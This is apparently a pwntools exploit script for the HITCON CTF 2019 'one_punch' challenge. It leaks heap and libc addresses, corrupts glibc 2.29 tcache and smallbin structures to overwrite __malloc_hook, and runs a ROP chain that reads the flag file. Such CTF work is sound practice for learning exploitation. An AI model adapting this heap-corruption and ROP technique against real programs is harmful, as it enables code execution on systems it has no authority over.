from pwn import *

context.arch = 'amd64'

p = process('./hitcon_ctf_2019_one_punch')

libc = ELF('libc-2.29.so')

ru = lambda s : p.recvuntil(s)
sn = lambda s : p.send(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)
sl = lambda s : p.sendline(s)
rv = lambda s : p.recv(s)

def debug(s):
	gdb.attach(p, '''
		source ~/libc/loadsym.py
		loadsym ~/libc/2.29/64/libc-2.29.debug.so
	''' + s)
	
def alloc(index, size, content):
	content = content.ljust(size, b'a')
	sla(b'>', b'1')
	sla(b'idx: ', str(index).encode())
	sla(b'name: ', content)

def delete(index):
	sla(b'>', b'4')
	sla(b'idx: ', str(index).encode())

def show(index):
	sla(b'>', b'3')
	sla(b'idx: ', str(index).encode())

def edit(index, content):
	sla(b'>', b'2')
	sla(b'idx: ', str(index).encode())
	sa(b'name: ', content)

def punch(content):
	sla(b'>', b'50056')
	sn(content)


alloc(0, 0x400, b'')
alloc(1, 0x400, b'')
delete(0)
delete(1)

show(1)

#context.log_level = 'debug'
ru(b'hero name: ')
heap_base = u64(rv(6).ljust(8, b'\x00')) - 0x260
success('heap_base -> {}'.format(hex(heap_base)))

for i in range(5):
	alloc(0, 0x400, b'a')
	delete(0)

alloc(0, 0x400, b'a')

for i in range(5):
	alloc(1, 0x210, b'a')
	delete(1)

delete(0)
show(0)

ru(b'hero name: ')
libc_base = u64(rv(6).ljust(8, b'\x00')) - 0x70 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))

#from unsortedb bin
alloc(1, 0x1e0, b'a')

#to small bin
alloc(1, 0x400, b'a')

payload = flat({
	0 : [ 0, 0x221, heap_base + 0x20b0, libc_base + libc.sym['__malloc_hook'] - 0x38 ],
	0x1e0 : [ 0, 0x221, 0x1234, heap_base + 0x1ed0 ]
}, filler = b'\x00')

edit(0, payload)

alloc(1, 0x210, b'a')

to_rop = 0x99540
pop_rdi_ret = 0x26542 + libc_base
pop_rsi_ret = 0x26f9e + libc_base
pop_rdx_ret = 0x12bda6 + libc_base
pop_rcx_ret = 0x10b31e + libc_base
pop_rax_ret = 0x47cf8 + libc_base
syscall_ret = 0xcf6c5 + libc_base

payload = flat({
	0x20 : b'flag\x00\x00\x00\x00',
	0x28 : libc_base + to_rop
})

punch(payload)

layout = [
	pop_rdi_ret,
	libc_base + libc.sym['__malloc_hook'] - 0x8,
	pop_rsi_ret,
	0,
	pop_rax_ret,
	2,
	syscall_ret,
	pop_rdi_ret,
	3,
	pop_rsi_ret,
	heap_base + 0x300,
	pop_rdx_ret,
	0x40,
	libc_base + libc.sym['read'],
	pop_rdi_ret,
	1,
	pop_rsi_ret,
	heap_base + 0x300,
	pop_rdx_ret,
	0x40,
	libc_base + libc.sym['write'],
	libc_base + libc.sym['exit']
]

#context.log_level = 'debug'
#debug('b *' + hex(libc_base + to_rop))

alloc(1, 0x300, flat(layout))

p.interactive()
